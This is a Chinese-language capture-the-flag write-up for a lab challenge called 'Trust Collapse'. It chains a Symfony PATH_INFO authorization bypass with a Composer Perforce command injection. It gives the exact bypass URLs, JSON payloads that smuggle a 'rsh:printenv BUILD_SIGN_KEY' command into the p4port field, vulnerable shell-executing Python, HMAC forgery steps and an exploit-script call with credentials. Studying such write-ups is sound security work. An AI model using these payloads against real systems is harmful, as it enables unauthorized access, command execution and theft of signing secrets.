# Trust Collapse

## 题目简述

`Trust Collapse` 是一道 Web + 构建系统的双洞利用链题。外部只访问 Web，内部还有 builder 和 coordinator；flag 不在构建节点直接回显，真正目标是先泄露内部签名密钥 `BUILD_SIGN_KEY`，再伪造合法 HMAC 请求访问内部 artifact 接口。

完整链路是：利用 Web 层路径解析差异绕过管理接口权限；越权修改项目配置，把构建流程切到 `workspace` / `legacy-sync` 危险分支；借赛题化的 Perforce/旧式集成通道触发命令执行泄露 `BUILD_SIGN_KEY`；最后经 Web 代理访问内部 coordinator，用签名请求读取最终 flag。

## 解题过程

### 使用的 CVE

本题组合使用了两条真实漏洞思路，但都做了赛题化落地，而不是对上游项目做逐行 1:1 复现。

### 1. `CVE-2025-64500`

- 组件：Symfony HttpFoundation
- 问题类型：`PATH_INFO` 解析不一致导致有限鉴权绕过
- 官方描述重点：在某些路径形式下，应用层可能基于错误的 `PATH_INFO` 做授权判断，从而让受保护路由在特定入口形式下被访问

本题中的映射方式：

- Web 层使用 `Symfony\Component\HttpFoundation\Request`
- 题目在 `deriveGatewayPath()` 中赛题化复现了“鉴权看到一套路径，路由命中另一套路径”的效果
- 结果是普通用户可以通过 `/index.php/admin/...` 和 `/index.php/internal/...` 命中原本只给管理员使用的接口

需要强调的是：

- 这里保留的是 `CVE-2025-64500` 的核心影响面
- 具体触发形式经过了题目改造，目的是让利用链稳定、可控、可复现

### 2. `CVE-2026-40261`

- 组件：Composer Perforce VCS driver
- 问题类型：Perforce 相关元数据进入危险命令路径，最终导致命令执行
- 官方描述重点：在 source 安装路径和 Perforce driver 参与的场景下，恶意元数据可能被带入危险命令生成逻辑

本题中的映射方式：

- builder 负责模拟依赖预览构建
- 当项目进入 `workspace` 执行模式，并把集成通道切到 `legacy-sync` 后，后端实际会走 `perforce` 分支
- 题目把危险点收敛到了 `p4port` 上，并在 `rsh:` 语义下触发命令执行

同样需要说明：

- 这里保留的是 “source-like execution + Perforce transport + attacker-controlled metadata -> command execution” 这条核心利用思路
- 具体实现做了赛题化简化，以保证比赛环境稳定，不依赖真实 Perforce 服务端

### 环境结构

- `web`：对外入口，负责登录、项目、构建、内部转发
- `builder`：本地 `127.0.0.1:9001`，负责依赖预览构建
- `coordinator`：本地 `127.0.0.1:9002`，只接受合法签名请求并保存 flag

外部只能访问 Web。builder 不直接保存 flag，公开构建结果也不会直接回显敏感材料。

### 题目目标

题目的真实目标是：

```text
拿到 BUILD_SIGN_KEY -> 构造 artifact:read 的合法 HMAC -> 访问内部 artifact 接口
```

因此，这不是一道“命令执行即结束”的题。

### 利用思路

### 一、利用路径解析差异绕过管理接口权限

Web 层有两套与路径相关的处理逻辑：

- 一套用于权限判断
- 一套用于最终路由匹配

在 `/index.php/admin/...` 或 `/index.php/internal/...` 这种入口形式下，题目代码会出现下面的分裂：

- 权限判断阶段看到的是：`admin/...`
- 路由命中阶段看到的是：`/admin/...`

于是：

- 管理路径检查没有命中
- 真实管理路由却仍然命中

这就是第一段利用链的入口。

可用的绕过入口：

```text
/index.php/admin/...
/index.php/internal/...
```

### 二、越权修改项目配置，把构建流程送入危险分支

拿到一个普通项目后，需要调用三类管理接口：

1. `POST /index.php/admin/integrations/register`
2. `POST /index.php/admin/workspace-policy/update`
3. `POST /index.php/admin/integrations/set-channel`

它们各自的作用如下：

1. 给项目挂一个可控的仓库配置
2. 把项目切到 `workspace` 模式
3. 把集成通道切到 `legacy-sync`

业务名看起来比较温和，但底层映射是关键：

- `workspace` 会把构建流程送到 source-like 执行路径
- `legacy-sync` 最终会映射成真正危险的 `perforce`

### 三、通过 Perforce 分支触发命令执行

builder 在进入 `workspace` 路径后，会处理项目挂载的仓库配置。

危险配置如下：

```json
{
  "url": "perforce://preview-cache:1666",
  "integration": "legacy-sync",
  "options": {
    "p4port": "rsh:printenv BUILD_SIGN_KEY",
    "p4user": "preview",
    "p4client": "source-audit"
  },
  "project": "<project_id>"
}
```

这里的关键点是：

- `legacy-sync` 在 Web 层被翻译成 `perforce`
- builder 在 Perforce 分支里处理 `p4port`
- 当 `p4port` 包含 `rsh:` 时，后面的内容被当作命令执行

因此可以直接把：

```text
printenv BUILD_SIGN_KEY
```

打进构建日志。

### 四、读取完整构建日志，提取签名密钥

公开构建接口只会返回 `public_log`，不会直接给出命令执行输出。

所以在触发构建后，还需要再次利用第一段绕过：

```text
GET /index.php/admin/build/<build_id>/log
```

这个接口会返回完整日志 `full_log`，其中包含：

- Perforce 相关参数
- `RSH STDOUT`
- `BUILD_SIGN_KEY` 的实际值

### 五、伪造内部请求签名

拿到 `BUILD_SIGN_KEY` 后，最后一步就是构造 coordinator 接受的签名。

签名规则：

- 参数：`timestamp`、`action`、`signature`
- `action` 必须为 `artifact:read`
- 消息格式：`{timestamp}|artifact:read`
- 算法：`HMAC-SHA256`
- 时间窗口：60 秒

最终请求：

```text
/index.php/internal/artifact/fetch?timestamp=...&action=artifact:read&signature=...
```

成功后即可拿到 flag。

### 关键代码点

下面只列对解题最关键的部分。

### 1. Web：路径差异与 ACL 绕过

文件：

- `trust-collapse/web/public/index.php`

核心点：

- `deriveGatewayPath()`：构造赛题化后的路径分裂
- `$pathInfo`：用于管理路径检查
- `$routePath`：用于路由命中
- `$isAdminPath`：只在路径以 `/admin` 或 `/internal` 开头时拦截

因此 `/index.php/admin/...` 会出现：

- 检查阶段没识别成管理路径
- 路由阶段却仍然命中了 `/admin/...`

### 2. Web：业务名到危险实现的映射

文件：

- `trust-collapse/web/public/index.php`

核心映射：

- `normalizeIntegrationType()`：`legacy-sync -> perforce`
- `normalizeExecutionMode()`：`workspace -> workspace`
- `executionProfileForProject()`：把项目送入 source-like 执行路径

### 3. Builder：命令执行点

文件：

- `trust-collapse/builder/server.py`

关键函数：

- `inspect_transport()`
- `inspect_repository_driver()`
- `_run_build()`

危险点在 `inspect_transport()`：

```python
if 'rsh:' in p4port:
    cmd_part = p4port.split('rsh:', 1)[1].strip()
    result = subprocess.run(
        cmd_part,
        shell=True,
        capture_output=True,
        text=True,
        timeout=30,
        env=dict(os.environ)
    )
```

也就是说，只要能让 `p4port` 进入这一分支，后面的命令就会被执行。

### 4. Coordinator：签名校验

文件：

- `trust-collapse/coordinator/server.py`

关键逻辑：

- `_verify_hmac()`
- `/internal/artifact/fetch`

它要求：

- `action == 'artifact:read'`
- `signature == HMAC_SHA256(BUILD_SIGN_KEY, f"{timestamp}|{action}")`

这决定了题目的最终目标是签名材料，而不是 builder 本地文件。

### 复现步骤

### Step 1：登录普通用户

接口：

```text
POST /login
```

### Step 2：创建项目

接口：

```text
POST /api/project
```

目的只是拿到一个合法的 `project_id`。

### Step 3：越权注册仓库配置

接口：

```text
POST /index.php/admin/integrations/register
```

请求体：

```json
{
  "url": "perforce://preview-cache:1666",
  "integration": "legacy-sync",
  "options": {
    "p4port": "rsh:printenv BUILD_SIGN_KEY",
    "p4user": "preview",
    "p4client": "source-audit"
  },
  "project": "<project_id>"
}
```

### Step 4：越权切换工作区模式

接口：

```text
POST /index.php/admin/workspace-policy/update
```

请求体：

```json
{
  "project": "<project_id>",
  "mode": "workspace"
}
```

### Step 5：越权切换集成通道

接口：

```text
POST /index.php/admin/integrations/set-channel
```

请求体：

```json
{
  "project": "<project_id>",
  "channel": "legacy-sync"
}
```

### Step 6：正常触发构建

接口：

```text
POST /api/build
```

返回中会给出：

- `build_id`
- 公开摘要日志

### Step 7：读取完整日志

接口：

```text
GET /index.php/admin/build/<build_id>/log
```

从 `full_log` 中提取 `BUILD_SIGN_KEY`。

### Step 8：构造 HMAC 并访问内部接口

最终访问：

```text
/index.php/internal/artifact/fetch?timestamp=...&action=artifact:read&signature=...
```

成功后返回：

```json
{
  "success": true,
  "flag": "flag{...}"
}
```

### 利用脚本

仓库根目录已经提供了发布版脚本：

```text
python exp.py --target http://127.0.0.1:80
```

如果需要显式指定账号：

```text
python exp.py --target http://127.0.0.1:80 --username developer --password Sp1r1tG4m3_2026_D3v3l0p3r
```

## 方法总结

这道题的核心不是单点漏洞，而是两段漏洞思路在业务流中的自然拼接：

```text
PATH_INFO 解析差异 -> 越权改项目配置 -> Perforce 分支命令执行 -> 泄露签名材料 -> 伪造内部请求
```

第一段解决“如何碰到本不该碰到的接口”，第二段解决“如何把权限面转成真实利用能力”，最后再通过签名逻辑把命令执行和 flag 之间拉开一层，这也是这题相比直接 RCE 题更完整的地方。

### 参考资料

- Symfony 官方公告：[`CVE-2025-64500`](https://symfony.com/blog/cve-2025-64500-incorrect-parsing-of-path-info-can-lead-to-limited-authorization-bypass)
- NVD：[`CVE-2025-64500`](https://nvd.nist.gov/vuln/detail/CVE-2025-64500)
- NVD：[`CVE-2026-40261`](https://nvd.nist.gov/vuln/detail/CVE-2026-40261)
